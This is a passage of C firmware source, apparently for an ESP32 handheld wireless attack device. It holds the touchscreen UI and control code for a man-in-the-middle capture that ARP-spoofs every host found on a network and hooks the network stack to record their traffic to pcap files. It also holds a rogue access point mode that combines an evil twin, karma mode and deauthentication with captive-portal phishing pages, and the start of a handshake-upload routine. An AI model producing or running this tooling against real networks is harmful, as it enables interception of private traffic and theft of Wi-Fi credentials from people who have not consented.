        mitm_hosts = heap_caps_malloc(MITM_MAX_HOSTS * sizeof(mitm_host_entry_t), MALLOC_CAP_SPIRAM);
    }
    if (!mitm_hosts) {
        ESP_LOGE(TAG, "MITM scan: PSRAM alloc failed for host table");
        mitm_scan_done = true;
        vTaskDelete(NULL);
        return;
    }

    for (int i = 0; i < ARP_TABLE_SIZE && mitm_host_count < MITM_MAX_HOSTS; i++) {
        ip4_addr_t *ip_ret;
        struct netif *netif_ret;
        struct eth_addr *eth_ret;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
            if (ip_ret->addr == mitm_gateway_ip) continue;
            if (ip_ret->addr == ip_info.ip.addr) continue;
            mitm_hosts[mitm_host_count].ip.addr = ip_ret->addr;
            memcpy(mitm_hosts[mitm_host_count].mac, eth_ret->addr, 6);
            mitm_host_count++;
        }
    }

    ESP_LOGI(TAG, "MITM scan: Found %d hosts (excluding gateway)", mitm_host_count);
    mitm_scan_done = true;
    vTaskDelete(NULL);
}

static int mitm_find_next_pcap_number(void)
{
    DIR *dir = opendir("/sdcard/lab/pcaps");
    if (!dir) return 1;
    int max_idx = 0;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        int idx = 0;
        if (sscanf(entry->d_name, "mitm_%d.pcap", &idx) == 1) {
            if (idx > max_idx) max_idx = idx;
        }
    }
    closedir(dir);
    return max_idx + 1;
}

static void mitm_stop(void)
{
    ESP_LOGI(TAG, "MITM: Stopping capture...");

    mitm_capture_active = false;
    mitm_arp_active = false;

    // Restore LwIP hooks first so no new frames are enqueued
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (sta_netif) {
        struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
        if (lwip_netif) {
            if (mitm_original_input) {
                lwip_netif->input = mitm_original_input;
                mitm_original_input = NULL;
            }
            if (mitm_original_linkoutput) {
                lwip_netif->linkoutput = mitm_original_linkoutput;
                mitm_original_linkoutput = NULL;
            }
        }
    }

    // Wait for ARP spoof task
    for (int i = 0; i < 80 && mitm_arp_task_handle != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    if (mitm_arp_task_handle != NULL) {
        vTaskDelete(mitm_arp_task_handle);
        mitm_arp_task_handle = NULL;
    }

    // Wait for writer task (up to 5s)
    for (int i = 0; i < 100 && mitm_writer_task_handle != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    if (mitm_writer_task_handle != NULL) {
        vTaskDelete(mitm_writer_task_handle);
        mitm_writer_task_handle = NULL;
    }

    // Writer task has exited; safe to close the file and take the mutex
    if (mitm_pcap_file) {
        if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
        fflush(mitm_pcap_file);
        fclose(mitm_pcap_file);
        mitm_pcap_file = NULL;
        sd_sync();
        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
    }

    if (mitm_packet_queue) {
        mitm_queued_frame_t *frame = NULL;
        while (xQueueReceive(mitm_packet_queue, &frame, 0) == pdTRUE) {
            heap_caps_free(frame);
        }
        vQueueDelete(mitm_packet_queue);
        mitm_packet_queue = NULL;
    }

    if (mitm_update_timer) {
        lv_timer_del(mitm_update_timer);
        mitm_update_timer = NULL;
    }

    mitm_status_label = NULL;
    mitm_hosts_label = NULL;
    mitm_stats_label = NULL;
    mitm_file_label = NULL;

    ESP_LOGI(TAG, "MITM: Stopped. frames=%lu drops=%lu file=%s",
             (unsigned long)mitm_frame_count, (unsigned long)mitm_drop_count,
             mitm_pcap_filepath);
}

static void mitm_show_results_screen(void);

static void mitm_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    mitm_stop();
    mitm_show_results_screen();
}

static void mitm_update_stats_cb(lv_timer_t *timer)
{
    (void)timer;
    if (!mitm_stats_label) return;

    char buf[128];
    int pos = 0;
    pos += snprintf(buf + pos, sizeof(buf) - pos, "Packets: %lu\n",
                    (unsigned long)mitm_frame_count);

    if (mitm_tcp_count > 0)
        pos += snprintf(buf + pos, sizeof(buf) - pos, "TCP: %lu  ", (unsigned long)mitm_tcp_count);
    if (mitm_udp_count > 0)
        pos += snprintf(buf + pos, sizeof(buf) - pos, "UDP: %lu  ", (unsigned long)mitm_udp_count);
    if (mitm_icmp_count > 0)
        pos += snprintf(buf + pos, sizeof(buf) - pos, "ICMP: %lu  ", (unsigned long)mitm_icmp_count);
    if (mitm_arp_pkt_count > 0)
        pos += snprintf(buf + pos, sizeof(buf) - pos, "ARP: %lu  ", (unsigned long)mitm_arp_pkt_count);
    if (mitm_other_proto_count > 0)
        pos += snprintf(buf + pos, sizeof(buf) - pos, "Other: %lu", (unsigned long)mitm_other_proto_count);

    if (mitm_drop_count > 0) {
        pos += snprintf(buf + pos, sizeof(buf) - pos, "\nDropped: %lu", (unsigned long)mitm_drop_count);
    }

    lv_label_set_text(mitm_stats_label, buf);
}

static void mitm_show_active_screen(void)
{
    create_function_page_base("MITM Capture");

    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_gap(content, 10, 0);

    lv_obj_t *icon_lbl = lv_label_create(content);
    lv_label_set_text(icon_lbl, LV_SYMBOL_LOOP);
    lv_obj_set_style_text_color(icon_lbl, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_text_font(icon_lbl, &lv_font_montserrat_20, 0);

    mitm_status_label = lv_label_create(content);
    lv_label_set_text(mitm_status_label, "MITM Capture in Progress");
    lv_obj_set_style_text_color(mitm_status_label, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_text_font(mitm_status_label, &lv_font_montserrat_16, 0);

    mitm_hosts_label = lv_label_create(content);
    char hosts_buf[48];
    snprintf(hosts_buf, sizeof(hosts_buf), "Spoofing %d hosts", mitm_host_count);
    lv_label_set_text(mitm_hosts_label, hosts_buf);
    lv_obj_set_style_text_color(mitm_hosts_label, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_text_font(mitm_hosts_label, &lv_font_montserrat_14, 0);

    mitm_file_label = lv_label_create(content);
    lv_label_set_text(mitm_file_label, "Preparing SD card...");
    lv_obj_set_style_text_color(mitm_file_label, lv_color_make(150, 150, 150), 0);
    lv_obj_set_style_text_font(mitm_file_label, &lv_font_montserrat_12, 0);

    mitm_stats_label = lv_label_create(content);
    lv_label_set_text(mitm_stats_label, "Packets: 0");
    lv_obj_set_style_text_color(mitm_stats_label, lv_color_make(200, 200, 200), 0);
    lv_obj_set_style_text_font(mitm_stats_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_align(mitm_stats_label, LV_TEXT_ALIGN_CENTER, 0);

    lv_obj_t *stop_btn = lv_btn_create(content);
    lv_obj_set_size(stop_btn, 160, 44);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(stop_btn, 0, 0);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_t *stop_lbl = lv_label_create(stop_btn);
    lv_label_set_text(stop_lbl, LV_SYMBOL_STOP " STOP");
    lv_obj_set_style_text_color(stop_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(stop_lbl, &lv_font_montserrat_16, 0);
    lv_obj_center(stop_lbl);
    lv_obj_add_event_cb(stop_btn, mitm_stop_btn_cb, LV_EVENT_CLICKED, NULL);

    lv_refr_now(NULL);

    // --- SD operations (screen is already visible) ---

    esp_err_t sd_ret = ensure_sd_mounted();
    if (sd_ret != ESP_OK) {
        ESP_LOGE(TAG, "MITM: SD mount failed");
        lv_label_set_text(mitm_status_label, "SD card mount failed!");
        lv_obj_set_style_text_color(mitm_status_label, COLOR_MATERIAL_RED, 0);
        lv_label_set_text(mitm_file_label, "");
        lv_refr_now(NULL);
        return;
    }

    mkdir("/sdcard/lab", 0775);
    mkdir("/sdcard/lab/pcaps", 0775);

    int file_num = mitm_find_next_pcap_number();
    snprintf(mitm_pcap_filepath, sizeof(mitm_pcap_filepath),
             "/sdcard/lab/pcaps/mitm_%d.pcap", file_num);

    ESP_LOGI(TAG, "MITM: opening %s, taking sd_spi_mutex...", mitm_pcap_filepath);
    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
    mitm_pcap_file = fopen(mitm_pcap_filepath, "wb");
    if (mitm_pcap_file) {
        pcap_global_header_t ghdr = {
            .magic_number = 0xa1b2c3d4,
            .version_major = 2,
            .version_minor = 4,
            .thiszone = 0,
            .sigfigs = 0,
            .snaplen = 65535,
            .network = LINKTYPE_ETHERNET
        };
        size_t hdr_w = fwrite(&ghdr, 1, sizeof(ghdr), mitm_pcap_file);
        int hdr_flush = fflush(mitm_pcap_file);
        ESP_LOGI(TAG, "MITM: PCAP header write=%d/%d, fflush=%d",
                 (int)hdr_w, (int)sizeof(ghdr), hdr_flush);
    } else {
        ESP_LOGE(TAG, "MITM: fopen failed! errno=%d", errno);
    }
    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
    ESP_LOGI(TAG, "MITM: sd_spi_mutex released after header write");

    if (!mitm_pcap_file) {
        ESP_LOGE(TAG, "MITM: Failed to open %s", mitm_pcap_filepath);
        lv_label_set_text(mitm_status_label, "Failed to create PCAP file!");
        lv_obj_set_style_text_color(mitm_status_label, COLOR_MATERIAL_RED, 0);
        lv_label_set_text(mitm_file_label, "");
        lv_refr_now(NULL);
        return;
    }

    char file_buf[80];
    snprintf(file_buf, sizeof(file_buf), "Writing to: mitm_%d.pcap", file_num);
    lv_label_set_text(mitm_file_label, file_buf);

    // --- Start capture (screen already drawn) ---

    mitm_packet_queue = xQueueCreate(MITM_QUEUE_SIZE, sizeof(mitm_queued_frame_t *));
    mitm_frame_count = 0;
    mitm_drop_count = 0;
    mitm_tcp_count = 0;
    mitm_udp_count = 0;
    mitm_icmp_count = 0;
    mitm_arp_pkt_count = 0;
    mitm_other_proto_count = 0;
    mitm_capture_active = true;
    mitm_arp_active = true;

    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
    if (lwip_netif) {
        mitm_original_input = lwip_netif->input;
        mitm_original_linkoutput = lwip_netif->linkoutput;
        lwip_netif->input = mitm_netif_input_hook;
        lwip_netif->linkoutput = mitm_netif_linkoutput_hook;
    }

    StackType_t *mitm_arp_stack = heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    static StaticTask_t mitm_arp_tcb;
    if (mitm_arp_stack) {
        mitm_arp_task_handle = xTaskCreateStatic(mitm_arp_spoof_task, "mitm_arp", 4096,
                                                  NULL, 5, mitm_arp_stack, &mitm_arp_tcb);
    } else {
        xTaskCreate(mitm_arp_spoof_task, "mitm_arp", 4096, NULL, 5, &mitm_arp_task_handle);
    }

    StackType_t *mitm_wr_stack = heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    static StaticTask_t mitm_wr_tcb;
    if (mitm_wr_stack) {
        mitm_writer_task_handle = xTaskCreateStatic(mitm_pcap_writer_task, "mitm_wr", 8192,
                                                     NULL, 5, mitm_wr_stack, &mitm_wr_tcb);
    } else {
        xTaskCreate(mitm_pcap_writer_task, "mitm_wr", 8192, NULL, 5, &mitm_writer_task_handle);
    }

    mitm_update_timer = lv_timer_create(mitm_update_stats_cb, 1000, NULL);

    ESP_LOGI(TAG, "MITM: Capture active, %d hosts, file=%s", mitm_host_count, mitm_pcap_filepath);
}

static void mitm_results_resume_cb(lv_event_t *e)
{
    (void)e;
    mitm_show_active_screen();
}

static void mitm_results_back_cb(lv_event_t *e)
{
    (void)e;
    if (mitm_hosts) {
        heap_caps_free(mitm_hosts);
        mitm_hosts = NULL;
    }
    mitm_host_count = 0;
    radio_reset_to_idle();
    nav_to_menu_flag = true;
}

static void mitm_show_results_screen(void)
{
    create_function_page_base("MITM Results");

    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_gap(content, 8, 0);

    lv_obj_t *title_lbl = lv_label_create(content);
    lv_label_set_text(title_lbl, "Capture Complete");
    lv_obj_set_style_text_color(title_lbl, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_text_font(title_lbl, &lv_font_montserrat_20, 0);

    lv_obj_t *packets_lbl = lv_label_create(content);
    char pkt_buf[64];
    snprintf(pkt_buf, sizeof(pkt_buf), "Packets captured: %lu", (unsigned long)mitm_frame_count);
    lv_label_set_text(packets_lbl, pkt_buf);
    lv_obj_set_style_text_color(packets_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(packets_lbl, &lv_font_montserrat_16, 0);

    // Packet type breakdown
    char stats_buf[128];
    int pos = 0;
    if (mitm_tcp_count > 0)
        pos += snprintf(stats_buf + pos, sizeof(stats_buf) - pos, "TCP: %lu  ", (unsigned long)mitm_tcp_count);
    if (mitm_udp_count > 0)
        pos += snprintf(stats_buf + pos, sizeof(stats_buf) - pos, "UDP: %lu  ", (unsigned long)mitm_udp_count);
    if (mitm_icmp_count > 0)
        pos += snprintf(stats_buf + pos, sizeof(stats_buf) - pos, "ICMP: %lu  ", (unsigned long)mitm_icmp_count);
    if (mitm_arp_pkt_count > 0)
        pos += snprintf(stats_buf + pos, sizeof(stats_buf) - pos, "ARP: %lu  ", (unsigned long)mitm_arp_pkt_count);
    if (mitm_other_proto_count > 0)
        pos += snprintf(stats_buf + pos, sizeof(stats_buf) - pos, "Other: %lu", (unsigned long)mitm_other_proto_count);
    if (pos > 0) {
        lv_obj_t *proto_lbl = lv_label_create(content);
        lv_label_set_text(proto_lbl, stats_buf);
        lv_obj_set_style_text_color(proto_lbl, ui_muted_color(), 0);
        lv_obj_set_style_text_font(proto_lbl, &lv_font_montserrat_12, 0);
    }

    if (mitm_drop_count > 0) {
        lv_obj_t *drops_lbl = lv_label_create(content);
        char drop_buf[64];
        snprintf(drop_buf, sizeof(drop_buf), "Dropped: %lu (queue full)", (unsigned long)mitm_drop_count);
        lv_label_set_text(drops_lbl, drop_buf);
        lv_obj_set_style_text_color(drops_lbl, COLOR_MATERIAL_ORANGE, 0);
        lv_obj_set_style_text_font(drops_lbl, &lv_font_montserrat_14, 0);
    }

    lv_obj_t *hosts_lbl = lv_label_create(content);
    char hosts_buf[48];
    snprintf(hosts_buf, sizeof(hosts_buf), "Hosts spoofed: %d", mitm_host_count);
    lv_label_set_text(hosts_lbl, hosts_buf);
    lv_obj_set_style_text_color(hosts_lbl, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_text_font(hosts_lbl, &lv_font_montserrat_14, 0);

    lv_obj_t *file_lbl = lv_label_create(content);
    char file_buf[80];
    const char *fname = strrchr(mitm_pcap_filepath, '/');
    snprintf(file_buf, sizeof(file_buf), "Saved: %s", fname ? fname + 1 : mitm_pcap_filepath);
    lv_label_set_text(file_lbl, file_buf);
    lv_obj_set_style_text_color(file_lbl, lv_color_make(150, 150, 150), 0);
    lv_obj_set_style_text_font(file_lbl, &lv_font_montserrat_12, 0);

    lv_obj_t *btn_row = lv_obj_create(content);
    lv_obj_set_size(btn_row, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_gap(btn_row, 16, 0);

    lv_obj_t *resume_btn = lv_btn_create(btn_row);
    lv_obj_set_size(resume_btn, 140, 44);
    lv_obj_set_style_bg_color(resume_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(resume_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(resume_btn, 0, 0);
    lv_obj_set_style_radius(resume_btn, 8, 0);
    lv_obj_t *resume_lbl = lv_label_create(resume_btn);
    lv_label_set_text(resume_lbl, LV_SYMBOL_PLAY " Resume");
    lv_obj_set_style_text_color(resume_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(resume_lbl, &lv_font_montserrat_16, 0);
    lv_obj_center(resume_lbl);
    lv_obj_add_event_cb(resume_btn, mitm_results_resume_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *back_btn = lv_btn_create(btn_row);
    lv_obj_set_size(back_btn, 140, 44);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(80, 80, 80), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(110, 110, 110), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_t *back_lbl = lv_label_create(back_btn);
    lv_label_set_text(back_lbl, LV_SYMBOL_LEFT " Back");
    lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(back_lbl, &lv_font_montserrat_16, 0);
    lv_obj_center(back_lbl);
    lv_obj_add_event_cb(back_btn, mitm_results_back_cb, LV_EVENT_CLICKED, NULL);

    lv_refr_now(NULL);
}

static void mitm_scan_check_timer_cb(lv_timer_t *timer)
{
    (void)timer;
    if (mitm_scan_done) {
        mitm_scan_done = false;
        if (mitm_scan_check_timer) {
            lv_timer_del(mitm_scan_check_timer);
            mitm_scan_check_timer = NULL;
        }
        if (mitm_host_count == 0) {
            create_function_page_base("MITM");
            lv_obj_t *err_lbl = lv_label_create(function_page);
            lv_label_set_text(err_lbl, "No hosts found on network");
            lv_obj_set_style_text_color(err_lbl, COLOR_MATERIAL_RED, 0);
            lv_obj_set_style_text_font(err_lbl, &lv_font_montserrat_16, 0);
            lv_obj_center(err_lbl);
            return;
        }
        mitm_show_active_screen();
    }
}

static void show_mitm_page(void)
{
    create_function_page_base("MITM");

    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_radius(content, 0, 0);
    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *spinner = lv_spinner_create(content, 1000, 60);
    lv_obj_set_size(spinner, 50, 50);
    lv_obj_align(spinner, LV_ALIGN_CENTER, 0, -20);

    lv_obj_t *scan_label = lv_label_create(content);
    lv_label_set_text(scan_label, "Scanning network for hosts...");
    lv_obj_set_style_text_color(scan_label, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_text_font(scan_label, &lv_font_montserrat_16, 0);
    lv_obj_align(scan_label, LV_ALIGN_CENTER, 0, 30);

    mitm_scan_done = false;
    mitm_host_count = 0;

    StackType_t *scan_stack = heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    static StaticTask_t scan_tcb;
    if (scan_stack) {
        xTaskCreateStatic(mitm_scan_task, "mitm_scan", 4096, NULL, 5, scan_stack, &scan_tcb);
    } else {
        xTaskCreate(mitm_scan_task, "mitm_scan", 4096, NULL, 5, NULL);
    }

    mitm_scan_check_timer = lv_timer_create(mitm_scan_check_timer_cb, 200, NULL);
}

static void rogue_ap_exit_cb(lv_event_t *e)
{
    (void)e;
    wifi_attacks_stop_portal();
    wifi_attacks_set_evil_twin_event_cb(NULL);
    rogue_ap_status_list = NULL;
    nav_to_menu_flag = true;
}

static void rogue_ap_start_btn_cb(lv_event_t *e)
{
    (void)e;
    
    if (!rogue_ap_html_dd || rogue_ap_html_count == 0) return;
    
    int html_sel = lv_dropdown_get_selected(rogue_ap_html_dd);
    if (html_sel >= rogue_ap_html_count) return;
    
    int html_index = rogue_ap_html_map[html_sel];
    esp_err_t html_res = wifi_attacks_select_sd_html(html_index);
    if (html_res != ESP_OK) {
        ESP_LOGW(TAG, "Failed to load HTML template");
    }
    
    // Create running page
    create_function_page_base("Rogue AP Active");
    
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_radius(content, 0, 0);
    lv_obj_set_style_pad_all(content, 5, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // Network info
    lv_obj_t *ssid_lbl = lv_label_create(content);
    char ssid_text[64];
    snprintf(ssid_text, sizeof(ssid_text), "AP: %s (WPA2)", wifi_connect_ssid);
    lv_label_set_text(ssid_lbl, ssid_text);
    lv_obj_set_style_text_color(ssid_lbl, COLOR_MATERIAL_INDIGO, 0);
    lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
    
    // Status list
    rogue_ap_status_list = lv_list_create(content);
    lv_obj_set_size(rogue_ap_status_list, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(rogue_ap_status_list, 1);
    lv_obj_set_style_bg_color(rogue_ap_status_list, lv_color_make(25, 25, 25), 0);
    lv_obj_set_style_border_color(rogue_ap_status_list, lv_color_make(50, 50, 50), 0);
    lv_obj_set_style_border_width(rogue_ap_status_list, 1, 0);
    lv_obj_set_style_radius(rogue_ap_status_list, 8, 0);
    lv_obj_set_style_pad_all(rogue_ap_status_list, 4, 0);
    
    // Exit button
    lv_obj_t *exit_btn = lv_btn_create(content);
    lv_obj_set_size(exit_btn, 120, 36);
    lv_obj_set_style_bg_color(exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_opa(exit_btn, LV_OPA_COVER, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(exit_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_text_color(exit_btn, ui_text_color(), 0);
    lv_obj_set_style_border_width(exit_btn, 0, 0);
    lv_obj_set_style_radius(exit_btn, 8, 0);
    lv_obj_t *exit_lbl = lv_label_create(exit_btn);
    lv_label_set_text(exit_lbl, "Stop & Exit");
    lv_obj_set_style_text_font(exit_lbl, &lv_font_montserrat_14, 0);
    lv_obj_center(exit_lbl);
    lv_obj_add_event_cb(exit_btn, rogue_ap_exit_cb, LV_EVENT_CLICKED, NULL);
    
    // Set up event queue
    if (!rogue_ap_event_queue) {
        rogue_ap_event_queue = xQueueCreate(16, sizeof(evil_twin_event_data_t));
    } else {
        xQueueReset(rogue_ap_event_queue);
    }
    
    wifi_attacks_set_evil_twin_event_cb(rogue_ap_ui_event_callback);
    wifi_attacks_set_karma_mode(true);
    
    // Start the rogue AP with deauth against target BSSID on same channel
    esp_err_t start_res = wifi_attacks_start_rogue_ap(wifi_connect_ssid, wifi_connect_password,
                                                      wifi_connect_bssid, wifi_connect_channel);
    if (start_res != ESP_OK) {
        rogue_ap_add_status_message("Failed to start Rogue AP", lv_color_make(255, 100, 100));
        wifi_attacks_set_evil_twin_event_cb(NULL);
    }
}

static void show_rogue_ap_page(void)
{
    esp_err_t sd_ret = ensure_sd_mounted();
    if (sd_ret != ESP_OK) {
        ESP_LOGW(TAG, "[ROGUE_AP_PAGE] SD card not available: %s", esp_err_to_name(sd_ret));
    }
    
    create_function_page_base("Rogue AP");
    wifi_attacks_refresh_sd_html_list();
    
    rogue_ap_content = lv_obj_create(function_page);
    lv_obj_set_size(rogue_ap_content, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(rogue_ap_content, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(rogue_ap_content, ui_bg_color(), 0);
    lv_obj_set_style_border_width(rogue_ap_content, 0, 0);
    lv_obj_set_style_radius(rogue_ap_content, 0, 0);
    lv_obj_set_style_pad_all(rogue_ap_content, 10, 0);
    lv_obj_set_flex_flow(rogue_ap_content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(rogue_ap_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // Network info
    lv_obj_t *net_label = lv_label_create(rogue_ap_content);
    char net_text[80];
    snprintf(net_text, sizeof(net_text), "Network: %s", wifi_connect_ssid);
    lv_label_set_text(net_label, net_text);
    lv_obj_set_style_text_color(net_label, COLOR_MATERIAL_INDIGO, 0);
    lv_obj_set_style_text_font(net_label, &lv_font_montserrat_14, 0);
    
    // HTML Portal dropdown
    lv_obj_t *html_label = lv_label_create(rogue_ap_content);
    lv_label_set_text(html_label, "Captive Portal HTML");
    lv_obj_set_style_text_color(html_label, ui_muted_color(), 0);
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_12, 0);
    
    rogue_ap_html_dd = lv_dropdown_create(rogue_ap_content);
    lv_obj_set_width(rogue_ap_html_dd, lv_pct(90));
    lv_obj_set_style_bg_color(rogue_ap_html_dd, lv_color_make(40, 40, 40), 0);
    lv_obj_set_style_text_color(rogue_ap_html_dd, lv_color_make(220, 220, 220), 0);
    lv_obj_set_style_border_color(rogue_ap_html_dd, lv_color_make(80, 80, 80), 0);
    lv_dropdown_set_dir(rogue_ap_html_dd, LV_DIR_BOTTOM);
    
    // Populate HTML dropdown
    rogue_ap_html_count = 0;
    int html_total = wifi_attacks_get_sd_html_count();
    size_t max_html = (html_total < 64) ? html_total : 64;
    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
    char *html_options = (char *)lv_mem_alloc(html_buf_size);
    if (!html_options) {
        html_options = NULL;
        max_html = 0;
    }
    
    size_t html_len = 0;
    if (html_options) html_options[0] = '\0';
    
    for (int i = 0; i < html_total && i < 64; i++) {
        const char *name = wifi_attacks_get_sd_html_name(i);
        if (!name) continue;
        char entry[64];
        const char *display = strrchr(name, '/');
        if (display) display++; else display = name;
        snprintf(entry, sizeof(entry), "%s\n", display);
        size_t entry_len = strlen(entry);
        if (html_options && html_len + entry_len < html_buf_size) {
            memcpy(html_options + html_len, entry, entry_len);
            html_len += entry_len;
            html_options[html_len] = '\0';
            rogue_ap_html_map[rogue_ap_html_count++] = i;
        }
    }
    
    if (rogue_ap_html_count == 0) {
        lv_dropdown_set_options(rogue_ap_html_dd, "No HTML templates");
    } else {
        lv_dropdown_set_options(rogue_ap_html_dd, html_options);
    }
    lv_dropdown_set_selected(rogue_ap_html_dd, 0);
    if (html_options) lv_mem_free(html_options);
    
    // Start button
    rogue_ap_start_btn = lv_btn_create(rogue_ap_content);
    lv_obj_set_size(rogue_ap_start_btn, 200, 44);
    lv_obj_set_style_bg_color(rogue_ap_start_btn, COLOR_MATERIAL_INDIGO, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_opa(rogue_ap_start_btn, LV_OPA_COVER, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(rogue_ap_start_btn, lv_color_lighten(COLOR_MATERIAL_INDIGO, 30), LV_STATE_PRESSED);
    lv_obj_set_style_bg_color(rogue_ap_start_btn, lv_color_make(60, 60, 60), LV_STATE_DISABLED);
    lv_obj_set_style_text_color(rogue_ap_start_btn, ui_text_color(), 0);
    lv_obj_set_style_border_width(rogue_ap_start_btn, 0, 0);
    lv_obj_set_style_radius(rogue_ap_start_btn, 8, 0);
    lv_obj_t *start_label = lv_label_create(rogue_ap_start_btn);
    lv_label_set_text(start_label, "Start Rogue AP");
    lv_obj_set_style_text_font(start_label, &lv_font_montserrat_16, 0);
    lv_obj_center(start_label);
    lv_obj_add_event_cb(rogue_ap_start_btn, rogue_ap_start_btn_cb, LV_EVENT_CLICKED, NULL);
    
    if (rogue_ap_html_count == 0) {
        lv_obj_add_state(rogue_ap_start_btn, LV_STATE_DISABLED);
    }
}

// ============================================================================
// WPA-SEC Upload Implementation
// ============================================================================

/**
 * @brief Read WPA-SEC API key from /sdcard/lab/wpa-sec.txt
 * Trims whitespace/newline. Requires sd_spi_mutex to be available.
 * @return true on success, false if file missing or empty
 */
static bool wpasec_read_key_from_sd(void)
{
    wpasec_api_key[0] = '\0';

